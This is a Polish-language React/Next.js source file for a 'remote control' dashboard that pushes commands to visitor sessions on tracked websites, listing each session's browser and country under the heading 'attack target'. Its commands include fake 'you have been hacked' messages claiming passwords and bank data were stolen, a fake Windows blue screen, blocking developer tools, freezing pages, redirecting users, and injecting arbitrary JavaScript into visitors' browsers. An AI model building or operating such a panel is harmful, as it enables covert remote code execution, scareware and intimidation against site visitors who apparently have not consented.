'use client';

import { useState, useEffect, useCallback } from 'react';
import { DashboardContent } from '@/components/dashboard';

// Typy komend z opisami
const COMMAND_TYPES = {
    // Straszaki
    scare_message: {
        name: '💀 Straszak - Zhakowano!',
        description: 'Wyświetla przerażający komunikat o włamaniu',
        category: 'scare',
        icon: '💀',
        defaultPayload: {
            title: '⚠️ UWAGA! WYKRYTO WŁAMANIE!',
            message: 'Twój system został skompromitowany. Wszystkie Twoje dane zostały przechwycone.',
            subMessage: 'Twoje hasła, dane bankowe i prywatne pliki są teraz w naszym posiadaniu.',
            duration: 0,
            glitch: true,
            sound: true
        }
    },
    fake_error: {
        name: '🖥️ Fałszywy błąd BSOD',
        description: 'Pokazuje niebieski ekran śmierci Windows',
        category: 'scare',
        icon: '🖥️',
        defaultPayload: {
            type: 'bsod',
            message: 'Twój komputer napotkał problem i wymaga ponownego uruchomienia.',
            duration: 0
        }
    },
    
    // Efekty wizualne
    hide_cursor: {
        name: '🖱️ Ukryj kursor',
        description: 'Ukrywa kursor myszy na stronie',
        category: 'visual',
        icon: '🖱️',
        defaultPayload: { duration: 10000 }
    },
    invert_colors: {
        name: '🎨 Odwróć kolory',
        description: 'Inwertuje wszystkie kolory na stronie',
        category: 'visual',
        icon: '🎨',
        defaultPayload: { enabled: true, duration: 10000 }
    },
    grayscale: {
        name: '⬛ Czarno-biały',
        description: 'Zmienia stronę na czarno-białą',
        category: 'visual',
        icon: '⬛',
        defaultPayload: { enabled: true, duration: 10000 }
    },
    blur_page: {
        name: '🌫️ Rozmyj stronę',
        description: 'Rozmywa całą zawartość strony',
        category: 'visual',
        icon: '🌫️',
        defaultPayload: { amount: 5, duration: 10000 }
    },
    rotate_page: {
        name: '🔄 Obróć stronę',
        description: 'Obraca całą stronę o określony kąt',
        category: 'visual',
        icon: '🔄',
        defaultPayload: { degrees: 180, duration: 10000 }
    },
    flip_page: {
        name: '🪞 Odbij stronę',
        description: 'Odbija stronę lustrzanie (pionowo lub poziomo)',
        category: 'visual',
        icon: '🪞',
        defaultPayload: { axis: 'y', duration: 10000 }
    },
    
    // Animacje
    shake_page: {
        name: '📳 Zatrzęś stroną',
        description: 'Efekt trzęsienia całej strony',
        category: 'animation',
        icon: '📳',
        defaultPayload: { intensity: 10, duration: 5000 }
    },
    matrix_effect: {
        name: '🟢 Efekt Matrix',
        description: 'Spadające zielone litery jak w filmie Matrix',
        category: 'animation',
        icon: '🟢',
        defaultPayload: { duration: 10000, opacity: 0.9 }
    },
    rainbow: {
        name: '🌈 Tęcza',
        description: 'Pulsujące kolory tęczy na całej stronie',
        category: 'animation',
        icon: '🌈',
        defaultPayload: { duration: 10000 }
    },
    typing_effect: {
        name: '⌨️ Efekt pisania',
        description: 'Wyświetla tekst literka po literce',
        category: 'animation',
        icon: '⌨️',
        defaultPayload: {
            text: 'Obserwuję każdy Twój ruch...',
            position: 'bottom-right',
            speed: 50,
            duration: 10000
        }
    },
    
    // Tekst i układ
    toggle_rtl: {
        name: '⬅️ Odwróć kierunek (RTL)',
        description: 'Zmienia kierunek tekstu z lewej na prawą (jak w języku arabskim)',
        category: 'text',
        icon: '⬅️',
        defaultPayload: { enabled: true, duration: 10000 }
    },
    change_font: {
        name: '🔤 Zmień czcionkę',
        description: 'Zmienia czcionkę na stronie (np. Comic Sans)',
        category: 'text',
        icon: '🔤',
        defaultPayload: { fontFamily: 'Comic Sans MS, cursive', duration: 10000 }
    },
    
    // Blokowanie
    block_console: {
        name: '🔒 Zablokuj konsolę',
        description: 'Blokuje dostęp do konsoli deweloperskiej (F12, Ctrl+Shift+I)',
        category: 'block',
        icon: '🔒',
        defaultPayload: {}
    },
    freeze_page: {
        name: '❄️ Zamróź stronę',
        description: 'Blokuje wszystkie interakcje na stronie',
        category: 'block',
        icon: '❄️',
        defaultPayload: { enabled: true, duration: 10000, message: 'Strona została zamrożona' }
    },
    
    // Nawigacja
    change_url: {
        name: '🔗 Zmień URL',
        description: 'Zmienia adres URL w pasku przeglądarki (bez przeładowania)',
        category: 'navigation',
        icon: '🔗',
        defaultPayload: { url: '/hacked', title: 'ZHAKOWANO' }
    },
    redirect: {
        name: '↗️ Przekieruj',
        description: 'Przekierowuje użytkownika na inną stronę',
        category: 'navigation',
        icon: '↗️',
        defaultPayload: { url: 'https://example.com', newTab: false }
    },
    
    // Dźwięk
    play_sound: {
        name: '🔊 Odtwórz dźwięk',
        description: 'Odtwarza dźwięk (beep, alarm lub z URL)',
        category: 'sound',
        icon: '🔊',
        defaultPayload: { type: 'alarm', frequency: 440, duration: 1000, volume: 0.5 }
    },
    
    // Kod
    inject_js: {
        name: '💉 Wstrzyknij JavaScript',
        description: 'Wykonuje dowolny kod JavaScript na stronie',
        category: 'code',
        icon: '💉',
        defaultPayload: { code: 'alert("Zostałeś zhakowany!");' }
    },
    
    // Reset
    reset_all: {
        name: '🔄 Reset wszystkiego',
        description: 'Usuwa wszystkie aktywne efekty i przywraca stronę do normy',
        category: 'reset',
        icon: '🔄',
        defaultPayload: {}
    },
    
    // Odblokowanie
    show_cursor: {
        name: '🖱️ Pokaż kursor',
        description: 'Przywraca widoczność kursora',
        category: 'reset',
        icon: '🖱️',
        defaultPayload: {}
    },
    unblock_console: {
        name: '🔓 Odblokuj konsolę',
        description: 'Przywraca dostęp do konsoli deweloperskiej',
        category: 'reset',
        icon: '🔓',
        defaultPayload: {}
    }
};

const CATEGORIES = {
    scare: { name: 'Straszaki', icon: '💀', color: 'red' },
    visual: { name: 'Efekty wizualne', icon: '🎨', color: 'purple' },
    animation: { name: 'Animacje', icon: '✨', color: 'cyan' },
    text: { name: 'Tekst i układ', icon: '📝', color: 'yellow' },
    block: { name: 'Blokowanie', icon: '🔒', color: 'orange' },
    navigation: { name: 'Nawigacja', icon: '🧭', color: 'blue' },
    sound: { name: 'Dźwięk', icon: '🔊', color: 'green' },
    code: { name: 'Kod', icon: '💻', color: 'pink' },
    reset: { name: 'Reset', icon: '🔄', color: 'gray' }
};

interface CommandHistoryItem {
    id: string;
    created_at: string;
    site_id: string;
    session_id: string | null;
    command_type: string;
    payload: Record<string, unknown>;
    executed: boolean;
    executed_at: string | null;
}

interface SessionInfo {
    session_id: string;
    visitor_id: string;
    site_id: string;
    started_at: string;
    device_info?: {
        browserName?: string;
        platform?: string;
        location?: {
            country?: string;
            city?: string;
        };
    };
}

export default function CommandsPage() {
    // Stan
    const [sites, setSites] = useState<string[]>([]);
    const [activeSessions, setActiveSessions] = useState<SessionInfo[]>([]);
    const [selectedSite, setSelectedSite] = useState<string>('');
    const [selectedSession, setSelectedSession] = useState<string>('all');
    const [selectedCommand, setSelectedCommand] = useState<string>('scare_message');
    const [payload, setPayload] = useState<Record<string, unknown>>(COMMAND_TYPES.scare_message.defaultPayload);
    const [history, setHistory] = useState<CommandHistoryItem[]>([]);
    const [loading, setLoading] = useState(true);
    const [sending, setSending] = useState(false);
    const [message, setMessage] = useState<{ type: 'success' | 'error'; text: string } | null>(null);
    const [activeCategory, setActiveCategory] = useState<string>('scare');
    
    // Modal historii
    const [selectedHistoryItem, setSelectedHistoryItem] = useState<CommandHistoryItem | null>(null);
    const [deletingHistory, setDeletingHistory] = useState(false);
    const [rerunningHistory, setRerunningHistory] = useState(false);

    // Pobierz dane
    const fetchData = useCallback(async () => {
        try {
            // Pobierz listę stron i historię komend
            const [historyRes, sessionsRes] = await Promise.all([
                fetch('/api/commands/history?limit=50'),
                fetch('/api/sessions?limit=100')
            ]);

            const sitesFromSessions = new Set<string>();
            
            // Pobierz sesje (niezależnie od statusu historii)
            if (sessionsRes.ok) {
                const sessionsData = await sessionsRes.json();
                sessionsData.sessions?.forEach((s: SessionInfo) => {
                    if (s.site_id) sitesFromSessions.add(s.site_id);
                });
                setActiveSessions(sessionsData.sessions || []);
            }

            // Pobierz historię komend (jeśli dostępna)
            if (historyRes.ok) {
                const historyData = await historyRes.json();
                setHistory(historyData.commands || []);
                
                // Dodaj też site_id z historii komend
                historyData.sites?.forEach((s: string) => sitesFromSessions.add(s));
            }
            
            setSites(Array.from(sitesFromSessions).sort());
        } catch (err) {
            console.error('Błąd pobierania danych:', err);
        } finally {
            setLoading(false);
        }
    }, []);

    useEffect(() => {
        fetchData();
        // Odświeżaj co 10 sekund
        const interval = setInterval(fetchData, 10000);
        return () => clearInterval(interval);
    }, [fetchData]);

    // Zmień payload gdy zmieni się typ komendy
    useEffect(() => {
        if (selectedCommand && COMMAND_TYPES[selectedCommand as keyof typeof COMMAND_TYPES]) {
            setPayload(COMMAND_TYPES[selectedCommand as keyof typeof COMMAND_TYPES].defaultPayload);
        }
    }, [selectedCommand]);

    // Filtruj sesje po wybranej stronie
    const filteredSessions = activeSessions.filter(s => !selectedSite || s.site_id === selectedSite);

    // Wyślij komendę
    const sendCommand = async () => {
        if (!selectedSite) {
            setMessage({ type: 'error', text: 'Wybierz stronę docelową!' });
            return;
        }

        setSending(true);
        setMessage(null);

        try {
            const response = await fetch('/api/commands', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    site_id: selectedSite,
                    session_id: selectedSession === 'all' ? null : selectedSession,
                    command_type: selectedCommand,
                    payload: payload,
                    expires_in: 300 // 5 minut
                })
            });

            const data = await response.json();

            if (response.ok) {
                setMessage({ type: 'success', text: data.message || 'Komenda wysłana!' });
                fetchData(); // Odśwież historię
            } else {
                setMessage({ type: 'error', text: data.error || 'Błąd wysyłania komendy' });
            }
        } catch (err) {
            setMessage({ type: 'error', text: 'Błąd połączenia z serwerem' });
        } finally {
            setSending(false);
        }
    };

    // Ponowne wykonanie komendy z historii
    const rerunHistoryCommand = async (item: CommandHistoryItem) => {
        setRerunningHistory(true);
        try {
            const response = await fetch('/api/commands', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    site_id: item.site_id,
                    session_id: item.session_id,
                    command_type: item.command_type,
                    payload: item.payload,
                    expires_in: 300
                })
            });

            const data = await response.json();

            if (response.ok) {
                setMessage({ type: 'success', text: '🔄 Komenda wysłana ponownie!' });
                setSelectedHistoryItem(null);
                fetchData();
            } else {
                setMessage({ type: 'error', text: data.error || 'Błąd wysyłania komendy' });
            }
        } catch (err) {
            console.error(err);
            setMessage({ type: 'error', text: 'Błąd połączenia z serwerem' });
        } finally {
            setRerunningHistory(false);
        }
    };

    // Usuń komendę z historii
    const deleteHistoryCommand = async (id: string) => {
        setDeletingHistory(true);
        try {
            const response = await fetch(`/api/commands/history/${id}`, {
                method: 'DELETE'
            });

            if (response.ok) {
                setMessage({ type: 'success', text: '🗑️ Usunięto z historii' });
                setSelectedHistoryItem(null);
                setHistory(prev => prev.filter(h => h.id !== id));
            } else {
                const data = await response.json();
                setMessage({ type: 'error', text: data.error || 'Błąd usuwania' });
            }
        } catch (err) {
            console.error(err);
            setMessage({ type: 'error', text: 'Błąd połączenia z serwerem' });
        } finally {
            setDeletingHistory(false);
        }
    };

    // Anuluj oczekujące komendy
    const cancelPendingCommands = async () => {
        if (!selectedSite) return;

        try {
            const response = await fetch(`/api/commands?site_id=${selectedSite}&pending_only=true`, {
                method: 'DELETE'
            });

            if (response.ok) {
                const data = await response.json();
                setMessage({ type: 'success', text: `Anulowano ${data.deleted} komend` });
                fetchData();
            }
        } catch (err) {
            setMessage({ type: 'error', text: 'Błąd anulowania komend' });
        }
    };

    // Renderuj edytor payload
    const renderPayloadEditor = () => {
        const cmd = COMMAND_TYPES[selectedCommand as keyof typeof COMMAND_TYPES];
        if (!cmd) return null;

        const entries = Object.entries(payload);
        if (entries.length === 0) return <p className="text-slate-500 italic">Ta komenda nie wymaga parametrów.</p>;

        return (
            <div className="space-y-4">
                {entries.map(([key, value]) => (
                    <div key={key}>
                        <label className="block text-sm font-medium text-slate-400 mb-1 capitalize">
                            {key.replace(/_/g, ' ')}
                        </label>
                        {typeof value === 'boolean' ? (
                            <button
                                onClick={() => setPayload({ ...payload, [key]: !value })}
                                className={`px-4 py-2 rounded-lg font-medium transition-colors ${
                                    value 
                                        ? 'bg-emerald-600 text-white' 
                                        : 'bg-slate-700 text-slate-400'
                                }`}
                            >
                                {value ? 'Włączone' : 'Wyłączone'}
                            </button>
                        ) : typeof value === 'number' ? (
                            <input
                                type="number"
                                value={value}
                                onChange={(e) => setPayload({ ...payload, [key]: parseFloat(e.target.value) || 0 })}
                                className="w-full bg-slate-800 border border-slate-600 rounded-lg px-3 py-2 text-white focus:border-blue-500 outline-none"
                            />
                        ) : (
                            <textarea
                                value={String(value)}
                                onChange={(e) => setPayload({ ...payload, [key]: e.target.value })}
                                rows={key === 'code' ? 5 : 2}
                                className="w-full bg-slate-800 border border-slate-600 rounded-lg px-3 py-2 text-white focus:border-blue-500 outline-none font-mono text-sm"
                            />
                        )}
                    </div>
                ))}
            </div>
        );
    };

    if (loading) {
        return (
            <div className="min-h-screen bg-slate-950 flex items-center justify-center">
                <div className="text-center">
                    <div className="animate-spin text-4xl mb-4">⏳</div>
                    <p className="text-slate-400">Ładowanie panelu sterowania...</p>
                </div>
            </div>
        );
    }

    return (
        <DashboardContent>
            {/* Header */}
                <div className="mb-8">
                    <h1 className="text-3xl font-bold text-white flex items-center gap-3 mb-2">
                        <span className="text-4xl">🎮</span>
                        Zdalne Sterowanie
                    </h1>
                    <p className="text-slate-400">
                        Panel do wysyłania komend do śledzonych stron - efekty "straszakowe" i kontrola
                    </p>

                    {/* Komunikat */}
                    {message && (
                        <div className={`p-4 rounded-lg mb-4 ${
                            message.type === 'success' 
                                ? 'bg-emerald-900/50 border border-emerald-700 text-emerald-300' 
                                : 'bg-red-900/50 border border-red-700 text-red-300'
                        }`}>
                            {message.type === 'success' ? '✅' : '❌'} {message.text}
                        </div>
                    )}
                </div>

                <div className="grid grid-cols-1 lg:grid-cols-3 gap-6">
                    {/* Lewa kolumna - wybór celu */}
                    <div className="space-y-6">
                        {/* Wybór strony */}
                        <div className="bg-slate-900 border border-slate-800 rounded-xl p-6">
                            <h3 className="text-lg font-bold text-white mb-4 flex items-center gap-2">
                                🎯 Cel ataku
                            </h3>
                            
                            <div className="space-y-4">
                                <div>
                                    <label className="block text-sm font-medium text-slate-400 mb-2">
                                        Strona (Site ID)
                                    </label>
                                    <select
                                        value={selectedSite}
                                        onChange={(e) => {
                                            setSelectedSite(e.target.value);
                                            setSelectedSession('all');
                                        }}
                                        className="w-full bg-slate-800 border border-slate-600 rounded-lg px-3 py-2.5 text-white focus:border-blue-500 outline-none"
                                    >
                                        <option value="">-- Wybierz stronę --</option>
                                        {sites.map(site => (
                                            <option key={site} value={site}>{site}</option>
                                        ))}
                                    </select>
                                </div>

                                <div>
                                    <label className="block text-sm font-medium text-slate-400 mb-2">
                                        Sesja docelowa
                                    </label>
                                    <select
                                        value={selectedSession}
                                        onChange={(e) => setSelectedSession(e.target.value)}
                                        className="w-full bg-slate-800 border border-slate-600 rounded-lg px-3 py-2.5 text-white focus:border-blue-500 outline-none"
                                        disabled={!selectedSite}
                                    >
                                        <option value="all">🌐 Wszystkie aktywne sesje</option>
                                        {filteredSessions.map(session => (
                                            <option key={session.session_id} value={session.session_id}>
                                                {session.session_id.substring(0, 8)}... | {session.device_info?.browserName || 'Unknown'} | {session.device_info?.location?.country || 'N/A'}
                                            </option>
                                        ))}
                                    </select>
                                </div>
                            </div>

                            {/* Info o aktywnych sesjach */}
                            {selectedSite && (
                                <div className="mt-4 p-3 bg-slate-800 rounded-lg">
                                    <div className="text-sm text-slate-400">
                                        Aktywne sesje na tej stronie:
                                    </div>
                                    <div className="text-2xl font-bold text-emerald-400">
                                        {filteredSessions.length}
                                    </div>
                                </div>
                            )}
                        </div>

                        {/* Szybkie akcje */}
                        <div className="bg-slate-900 border border-slate-800 rounded-xl p-6">
                            <h3 className="text-lg font-bold text-white mb-4 flex items-center gap-2">
                                ⚡ Szybkie akcje
                            </h3>
                            
                            <div className="grid grid-cols-2 gap-2">
                                <button
                                    onClick={() => {
                                        setSelectedCommand('scare_message');
                                        setActiveCategory('scare');
                                    }}
                                    className="p-3 bg-red-900/30 hover:bg-red-900/50 border border-red-800 rounded-lg text-red-300 text-sm font-medium transition-colors"
                                >
                                    💀 Straszak
                                </button>
                                <button
                                    onClick={() => {
                                        setSelectedCommand('matrix_effect');
                                        setActiveCategory('animation');
                                    }}
                                    className="p-3 bg-green-900/30 hover:bg-green-900/50 border border-green-800 rounded-lg text-green-300 text-sm font-medium transition-colors"
                                >
                                    🟢 Matrix
                                </button>
                                <button
                                    onClick={() => {
                                        setSelectedCommand('block_console');
                                        setActiveCategory('block');
                                    }}
                                    className="p-3 bg-orange-900/30 hover:bg-orange-900/50 border border-orange-800 rounded-lg text-orange-300 text-sm font-medium transition-colors"
                                >
                                    🔒 Blokada
                                </button>
                                <button
                                    onClick={() => {
                                        setSelectedCommand('reset_all');
                                        setActiveCategory('reset');
                                    }}
                                    className="p-3 bg-slate-700/50 hover:bg-slate-700 border border-slate-600 rounded-lg text-slate-300 text-sm font-medium transition-colors"
                                >
                                    🔄 Reset
                                </button>
                            </div>

                            <button
                                onClick={cancelPendingCommands}
                                disabled={!selectedSite}
                                className="w-full mt-4 p-3 bg-slate-800 hover:bg-slate-700 border border-slate-600 rounded-lg text-slate-300 text-sm font-medium transition-colors disabled:opacity-50"
                            >
                                🚫 Anuluj oczekujące komendy
                            </button>
                        </div>
                    </div>

                    {/* Środkowa kolumna - wybór komendy */}
                    <div className="bg-slate-900 border border-slate-800 rounded-xl p-6">
                        <h3 className="text-lg font-bold text-white mb-4 flex items-center gap-2">
                            🎛️ Wybierz komendę
                        </h3>

                        {/* Kategorie */}
                        <div className="flex flex-wrap gap-2 mb-4">
                            {Object.entries(CATEGORIES).map(([key, cat]) => (
                                <button
                                    key={key}
                                    onClick={() => setActiveCategory(key)}
                                    className={`px-3 py-1.5 rounded-full text-xs font-medium transition-colors ${
                                        activeCategory === key
                                            ? 'bg-blue-600 text-white'
                                            : 'bg-slate-800 text-slate-400 hover:bg-slate-700'
                                    }`}
                                >
                                    {cat.icon} {cat.name}
                                </button>
                            ))}
                        </div>

                        {/* Lista komend */}
                        <div className="space-y-2 max-h-[500px] overflow-y-auto pr-2">
                            {Object.entries(COMMAND_TYPES)
                                .filter(([, cmd]) => cmd.category === activeCategory)
                                .map(([key, cmd]) => (
                                    <button
                                        key={key}
                                        onClick={() => setSelectedCommand(key)}
                                        className={`w-full p-3 rounded-lg text-left transition-all ${
                                            selectedCommand === key
                                                ? 'bg-blue-600 text-white border-2 border-blue-400'
                                                : 'bg-slate-800 hover:bg-slate-700 border-2 border-transparent'
                                        }`}
                                    >
                                        <div className="flex items-center gap-2">
                                            <span className="text-xl">{cmd.icon}</span>
                                            <div>
                                                <div className="font-medium">{cmd.name.replace(/^[^\s]+\s/, '')}</div>
                                                <div className={`text-xs ${selectedCommand === key ? 'text-blue-200' : 'text-slate-500'}`}>
                                                    {cmd.description}
                                                </div>
                                            </div>
                                        </div>
                                    </button>
                                ))}
                        </div>
                    </div>

                    {/* Prawa kolumna - parametry i wysyłanie */}
                    <div className="space-y-6">
                        {/* Parametry komendy */}
                        <div className="bg-slate-900 border border-slate-800 rounded-xl p-6">
                            <h3 className="text-lg font-bold text-white mb-4 flex items-center gap-2">
                                ⚙️ Parametry: {COMMAND_TYPES[selectedCommand as keyof typeof COMMAND_TYPES]?.name.replace(/^[^\s]+\s/, '')}
                            </h3>
                            
                            {renderPayloadEditor()}
                        </div>

                        {/* Przycisk wysyłania */}
                        <button
                            onClick={sendCommand}
                            disabled={!selectedSite || sending}
                            className={`w-full p-4 rounded-xl font-bold text-lg transition-all ${
                                !selectedSite
                                    ? 'bg-slate-800 text-slate-500 cursor-not-allowed'
                                    : sending
                                        ? 'bg-blue-800 text-blue-300 cursor-wait'
                                        : 'bg-gradient-to-r from-red-600 to-orange-600 hover:from-red-500 hover:to-orange-500 text-white shadow-lg shadow-red-900/50'
                            }`}
                        >
                            {sending ? (
                                <>⏳ Wysyłanie...</>
                            ) : (
                                <>🚀 WYŚLIJ KOMENDĘ</>
                            )}
                        </button>

                        {/* Podgląd JSON */}
                        <div className="bg-slate-900 border border-slate-800 rounded-xl p-4">
                            <div className="text-xs text-slate-500 mb-2">Podgląd komendy (JSON):</div>
                            <pre className="bg-slate-950 p-3 rounded-lg text-xs text-slate-400 overflow-auto max-h-32 font-mono">
{JSON.stringify({
    site_id: selectedSite || '(wybierz)',
    session_id: selectedSession === 'all' ? null : selectedSession,
    command_type: selectedCommand,
    payload
}, null, 2)}
                            </pre>
                        </div>
                    </div>
                </div>

                {/* Historia komend */}
                <div className="mt-8 bg-slate-900 border border-slate-800 rounded-xl overflow-hidden">
                    <div className="p-6 border-b border-slate-800">
                        <h3 className="text-xl font-bold text-white flex items-center gap-2">
                            📜 Historia komend
                        </h3>
                    </div>
                    
                    <div className="overflow-x-auto">
                        <table className="w-full">
                            <thead className="bg-slate-800 text-slate-400 text-xs uppercase">
                                <tr>
                                    <th className="p-4 text-left">Czas</th>
                                    <th className="p-4 text-left">Strona</th>
                                    <th className="p-4 text-left">Sesja</th>
                                    <th className="p-4 text-left">Komenda</th>
                                    <th className="p-4 text-left">Status</th>
                                </tr>
                            </thead>
                            <tbody className="divide-y divide-slate-800">
                                {history.length === 0 ? (
                                    <tr>
                                        <td colSpan={5} className="p-8 text-center text-slate-500">
                                            Brak historii komend. Wyślij pierwszą komendę!
                                        </td>
                                    </tr>
                                ) : (
                                    history.map((cmd) => {
                                        const cmdType = COMMAND_TYPES[cmd.command_type as keyof typeof COMMAND_TYPES];
                                        return (
                                            <tr 
                                                key={cmd.id} 
                                                className="hover:bg-slate-800/50 cursor-pointer transition-colors group"
                                                onClick={() => setSelectedHistoryItem(cmd)}
                                            >
                                                <td className="p-4 text-sm text-slate-400 group-hover:text-slate-300">
                                                    {new Date(cmd.created_at).toLocaleString('pl-PL')}
                                                </td>
                                                <td className="p-4 text-sm font-mono text-blue-400">
                                                    {cmd.site_id}
                                                </td>
                                                <td className="p-4 text-sm font-mono text-slate-500">
                                                    {cmd.session_id ? cmd.session_id.substring(0, 8) + '...' : 'Wszystkie'}
                                                </td>
                                                <td className="p-4">
                                                    <span className="flex items-center gap-2">
                                                        <span>{cmdType?.icon || '❓'}</span>
                                                        <span className="text-white">
                                                            {cmdType?.name.replace(/^[^\s]+\s/, '') || cmd.command_type}
                                                        </span>
                                                    </span>
                                                </td>
                                                <td className="p-4">
                                                    <div className="flex items-center gap-2">
                                                        {cmd.executed ? (
                                                            <span className="inline-flex items-center gap-1 px-2 py-1 bg-emerald-900/50 text-emerald-400 text-xs rounded-full">
                                                                ✅ Wykonana
                                                            </span>
                                                        ) : (
                                                            <span className="inline-flex items-center gap-1 px-2 py-1 bg-yellow-900/50 text-yellow-400 text-xs rounded-full">
                                                                ⏳ Oczekuje
                                                            </span>
                                                        )}
                                                        <span className="text-slate-600 opacity-0 group-hover:opacity-100 transition-opacity text-xs">
                                                            Kliknij →
                                                        </span>
                                                    </div>
                                                </td>
                                            </tr>
                                        );
                                    })
                                )}
                            </tbody>
                        </table>
                    </div>
                </div>

                {/* Modal szczegółów historii */}
                {selectedHistoryItem && (
                    <div 
                        className="fixed inset-0 bg-black/80 backdrop-blur-sm z-50 flex items-center justify-center p-4"
                        onClick={() => setSelectedHistoryItem(null)}
                    >
                        <div 
                            className="bg-slate-900 border border-slate-700 rounded-2xl max-w-2xl w-full max-h-[90vh] overflow-hidden shadow-2xl"
                            onClick={e => e.stopPropagation()}
                        >
                            {/* Header */}
                            <div className="p-6 border-b border-slate-800 flex items-center justify-between">
                                <div className="flex items-center gap-3">
                                    <span className="text-3xl">
                                        {COMMAND_TYPES[selectedHistoryItem.command_type as keyof typeof COMMAND_TYPES]?.icon || '❓'}
                                    </span>
                                    <div>
                                        <h3 className="text-xl font-bold text-white">
                                            {COMMAND_TYPES[selectedHistoryItem.command_type as keyof typeof COMMAND_TYPES]?.name || selectedHistoryItem.command_type}
                                        </h3>
                                        <p className="text-sm text-slate-400">
                                            {new Date(selectedHistoryItem.created_at).toLocaleString('pl-PL')}
                                        </p>
                                    </div>
                                </div>
                                <button 
                                    onClick={() => setSelectedHistoryItem(null)}
                                    className="text-slate-400 hover:text-white p-2 hover:bg-slate-800 rounded-lg transition-colors"
                                >
                                    ✕
                                </button>
                            </div>

                            {/* Content */}
                            <div className="p-6 space-y-4 overflow-y-auto max-h-[60vh]">
                                {/* Status */}
                                <div className="flex items-center gap-4">
                                    {selectedHistoryItem.executed ? (
                                        <span className="inline-flex items-center gap-2 px-4 py-2 bg-emerald-900/50 border border-emerald-500/30 text-emerald-400 rounded-full">
                                            ✅ Wykonana
                                            {selectedHistoryItem.executed_at && (
                                                <span className="text-xs text-emerald-400/70">
                                                    • {new Date(selectedHistoryItem.executed_at).toLocaleString('pl-PL')}
                                                </span>
                                            )}
                                        </span>
                                    ) : (
                                        <span className="inline-flex items-center gap-2 px-4 py-2 bg-yellow-900/50 border border-yellow-500/30 text-yellow-400 rounded-full animate-pulse">
                                            ⏳ Oczekuje na wykonanie
                                        </span>
                                    )}
                                </div>

                                {/* Szczegóły */}
                                <div className="grid grid-cols-2 gap-4">
                                    <div className="bg-slate-800/50 p-4 rounded-xl border border-slate-700">
                                        <div className="text-xs text-slate-500 mb-1">Site ID</div>
                                        <div className="text-blue-400 font-mono">{selectedHistoryItem.site_id}</div>
                                    </div>
                                    <div className="bg-slate-800/50 p-4 rounded-xl border border-slate-700">
                                        <div className="text-xs text-slate-500 mb-1">Sesja</div>
                                        <div className="text-purple-400 font-mono">
                                            {selectedHistoryItem.session_id || 'Wszystkie sesje'}
                                        </div>
                                    </div>
                                    <div className="bg-slate-800/50 p-4 rounded-xl border border-slate-700">
                                        <div className="text-xs text-slate-500 mb-1">Typ komendy</div>
                                        <div className="text-cyan-400">{selectedHistoryItem.command_type}</div>
                                    </div>
                                    <div className="bg-slate-800/50 p-4 rounded-xl border border-slate-700">
                                        <div className="text-xs text-slate-500 mb-1">ID komendy</div>
                                        <div className="text-slate-400 font-mono text-xs">{selectedHistoryItem.id}</div>
                                    </div>
                                </div>

                                {/* Payload */}
                                <div className="bg-slate-800/50 p-4 rounded-xl border border-slate-700">
                                    <div className="text-xs text-slate-500 mb-2">Payload (dane komendy)</div>
                                    <pre className="text-sm text-amber-400 font-mono bg-slate-900 p-3 rounded-lg overflow-x-auto">
                                        {JSON.stringify(selectedHistoryItem.payload, null, 2)}
                                    </pre>
                                </div>

                                {/* Opis komendy */}
                                {COMMAND_TYPES[selectedHistoryItem.command_type as keyof typeof COMMAND_TYPES]?.description && (
                                    <div className="bg-blue-900/20 border border-blue-500/30 p-4 rounded-xl">
                                        <div className="text-xs text-blue-400 mb-1">ℹ️ Opis</div>
                                        <p className="text-sm text-slate-300">
                                            {COMMAND_TYPES[selectedHistoryItem.command_type as keyof typeof COMMAND_TYPES].description}
                                        </p>
                                    </div>
                                )}
                            </div>

                            {/* Footer - akcje */}
                            <div className="p-6 border-t border-slate-800 flex items-center justify-between gap-4">
                                <button
                                    onClick={() => deleteHistoryCommand(selectedHistoryItem.id)}
                                    disabled={deletingHistory}
                                    className="px-4 py-2 bg-red-600/20 border border-red-500/30 text-red-400 rounded-lg hover:bg-red-600/30 transition-colors disabled:opacity-50 flex items-center gap-2"
                                >
                                    {deletingHistory ? (
                                        <>
                                            <span className="animate-spin">⏳</span> Usuwam...
                                        </>
                                    ) : (
                                        <>
                                            🗑️ Usuń z historii
                                        </>
                                    )}
                                </button>

                                <div className="flex gap-3">
                                    <button
                                        onClick={() => setSelectedHistoryItem(null)}
                                        className="px-4 py-2 bg-slate-800 border border-slate-700 text-slate-300 rounded-lg hover:bg-slate-700 transition-colors"
                                    >
                                        Zamknij
                                    </button>
                                    <button
                                        onClick={() => rerunHistoryCommand(selectedHistoryItem)}
                                        disabled={rerunningHistory}
                                        className="px-6 py-2 bg-emerald-600 text-white rounded-lg hover:bg-emerald-700 transition-colors disabled:opacity-50 flex items-center gap-2 font-bold"
                                    >
                                        {rerunningHistory ? (
                                            <>
                                                <span className="animate-spin">⏳</span> Wysyłam...
                                            </>
                                        ) : (
                                            <>
                                                🔄 Wykonaj ponownie
                                            </>
                                        )}
                                    </button>
                                </div>
                            </div>
                        </div>
                    </div>
                )}
        </DashboardContent>
    );
}

